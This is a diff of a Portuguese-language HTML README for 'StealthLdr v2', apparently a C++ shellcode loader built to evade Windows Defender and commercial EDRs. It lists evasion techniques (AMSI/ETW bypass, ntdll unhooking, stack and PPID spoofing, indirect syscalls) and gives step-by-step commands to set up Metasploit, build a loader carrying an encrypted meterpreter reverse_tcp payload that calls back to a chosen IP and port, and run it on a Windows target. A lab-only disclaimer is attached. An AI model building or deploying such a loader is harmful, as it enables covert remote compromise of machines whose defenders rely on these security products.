@@ -2,79 +2,86 @@
 
 <img src='a.jpg' alt='img'>
         
-<p><strong>Loader stealth em C++</strong> com <strong>Indirect Syscalls</strong>, AES-256 encryption, Patchless AMSI/ETW Bypass, Stack Spoofing e mais.</p>
-        
-<p><strong>Propósito:</strong> Estudo de técnicas modernas de evasão contra AV/EDR (Windows Defender, CrowdStrike, SentinelOne, etc.).</p>
+<h1>StealthLdr v2</h1>
+        <h2>Advanced Shellcode Loader 2026</h2>
 
-<div class="warning">
-            <strong>⚠️ AVISO LEGAL:</strong> Este projeto é exclusivamente para fins educacionais e pesquisa em ambientes de laboratório controlados. 
+        <p><strong>Loader stealth em C++</strong> com foco em evasão avançada contra EDRs modernos.</p>
+
+        <div class="warning">
+            <strong>⚠️ AVISO LEGAL:</strong> Este projeto é exclusivamente para fins educacionais, pesquisa e testes em ambientes de laboratório controlados (VMs isoladas). 
             Qualquer uso em sistemas sem autorização expressa é ilegal. Use com responsabilidade.
-</div>
+        </div>
 
-<h2>Features</h2>
-<ul>
-<li>Indirect Syscalls via <strong>SysWhispers4</strong> (melhor abordagem atual)</li>
-<li>AES-256-CBC encryption do shellcode (com padding)</li>
-<li>Patchless AMSI Bypass</li>
-<li>Patchless ETW Bypass</li>
-<li>Stack Spoofing básico</li>
-<li>Alocação e execução via Nt* functions indiretas</li>
-<li>Compilação estática com MinGW (binário menor e mais stealth)</li>
-<li>Pipeline 100% automático com <code>build.sh</code></li>
-</ul>
+        <h2>Funcionalidades</h2>
+        <ul>
+            <li>Indirect Syscalls via <strong>SysWhispers4</strong></li>
+            <li>AES-256-CBC encryption do shellcode</li>
+            <li>Patchless AMSI + ETW Bypass</li>
+            <li>Unhooking básico da ntdll</li>
+            <li>Stack Spoofing</li>
+            <li>PPID Spoofing</li>
+            <li>Execução via Nt* functions indiretas</li>
+            <li>Pipeline de build 100% automatizado</li>
+        </ul>
 
-<h2>Como usar (muito simples)</h2>
-<pre><code>git clone https://github.com/sucloudflare/StealthLdr.git
-cd StealthLdr
+        <h2>Como usar</h2>
 
-chmod +x build.sh
-./build.sh SEU_IP 4444 meu_payload.exe</code></pre>
+        <h3>1. Clonar o repositório</h3>
+        <pre><code>git clone https://github.com/sucloudflare/StealthLdr.git
+cd StealthLdr</code></pre>
 
-<p><strong>Exemplo:</strong></p>
-<pre><code>./build.sh 192.168.1.100 443 beacon.exe</code></pre>
+        <h3>2. Instalar dependências (Kali Linux)</h3>
+        <pre><code>sudo apt update
+sudo apt install metasploit-framework mingw-w64 git python3 python3-pip -y
+pip3 install pycryptodome
 
-<p>O script faz tudo automaticamente:</p>
-<ul>
-<li>Atualiza SysWhispers4</li>
-<li>Gera indirect syscalls</li>
-<li>Gera shellcode (windows/x64/meterpreter/reverse_tcp)</li>
-<li>Encripta com AES-256</li>
-<li>Compila o loader</li>
-</ul>
+# Iniciar banco do Metasploit
+sudo systemctl start postgresql
+sudo systemctl enable postgresql
+sudo msfdb init</code></pre>
 
-<h2>Requisitos (Kali Linux recomendado)</h2>
-<pre><code>sudo apt update &amp;&amp; sudo apt install mingw-w64 git python3 python3-pip -y
-pip3 install pycryptodome</code></pre>
+        <h3>3. Compilar o loader</h3>
+        <pre><code>chmod +x build.sh
 
-<h2>Testes Recomendados</h2>
-<ul>
-<li>VM Windows 11 limpa com Defender ativado</li>
-<li>Tire snapshot antes de testar</li>
-<li>Monitore com Process Hacker, ProcMon ou EDR de avaliação</li>
-</ul>
+# Exemplo de uso
+./build.sh SEU_IP 4444 nome_do_payload.exe</code></pre>
 
-<h2>Limitações (2026)</h2>
-<ul>
-<li>Não é "undetectable forever". EDRs evoluem rapidamente.</li>
-<li>Teste sempre em ambiente de laboratório.</li>
-<li>Para mais stealth: adicione PPID Spoofing, Module Stomping ou Early-Bird APC manualmente no código.</li>
-</ul>
+        <h3>Exemplos</h3>
+        <pre><code># Usando porta padrão
+./build.sh 192.168.1.100 4444 stealth_beacon.exe
 
-<h2>Como colocar no GitHub</h2>
-<ol>
-<li>Crie um novo repositório chamado <strong>StealthLdr</strong></li>
-<li>Clone localmente</li>
-<li>Cole todos os arquivos do projeto</li>
-<li>Adicione <code>aes.h</code> e <code>aes.c</code> do repositório <a href="https://github.com/kokke/tiny-AES-c" target="_blank">tiny-AES-c</a></li>
-<li>Execute: <code>git add . &amp;&amp; git commit -m "Initial commit - StealthLdr 2026" &amp;&amp; git push</code></li>
-</ol>
+# Ou com nome personalizado
+./build.sh 10.10.13.37 443 meu_payload.exe</code></pre>
 
-<p><strong>Para compilar e testar:</strong></p>
-<pre><code>./build.sh SEU_IP 4444 teste.exe</code></pre>
-<p>Transfira o <code>.exe</code> + <code>shellcode.enc</code> para a VM Windows e execute.</p>
+        <h3>4. Testar no Windows</h3>
+        <p>Transfira os arquivos gerados para a máquina Windows e execute:</p>
+        <pre><code>stealth_beacon.exe shellcode.enc</code></pre>
 
-<hr>
-<p style="text-align: center; color: #666; margin-top: 50px;">
-            Feito para estudo de <strong>Red Team</strong> e <strong>Malware Development</strong>.<br>
-            Use apenas com autorização!
-</p>
+        <h2>Estrutura do Projeto</h2>
+        <ul>
+            <li><code>build.sh</code> — Script de automação completo</li>
+            <li><code>main.cpp</code> — Ponto de entrada</li>
+            <li><code>evasion.cpp</code> — Bypass AMSI/ETW + Unhooking</li>
+            <li><code>crypto.cpp + aes.c</code> — Encriptação AES-256</li>
+            <li><code>spoofing.cpp</code> — Stack Spoofing</li>
+            <li><code>injection.cpp</code> — Injeção via indirect syscalls</li>
+            <li><code>syscalls.*</code> — Gerados automaticamente pelo SysWhispers4</li>
+        </ul>
+
+        <h2>Requisitos</h2>
+        <ul>
+            <li>Kali Linux (recomendado)</li>
+            <li>metasploit-framework</li>
+            <li>mingw-w64</li>
+            <li>Python 3 + pycryptodome</li>
+        </ul>
+
+        <h2>Limitações</h2>
+        <p>Não existe loader indetectável para sempre. EDRs evoluem rapidamente. Esta versão é destinada ao estudo e deve ser usada apenas em laboratório.</p>
+
+        <hr>
+        <footer>
+            Feito para estudo de <strong>Red Team</strong> e <strong>Offensive Security</strong>.<br>
+            <strong>Use apenas em ambientes controlados e com autorização.</strong><br><br>
+            StealthLdr v2 • 2026
+        </footer>
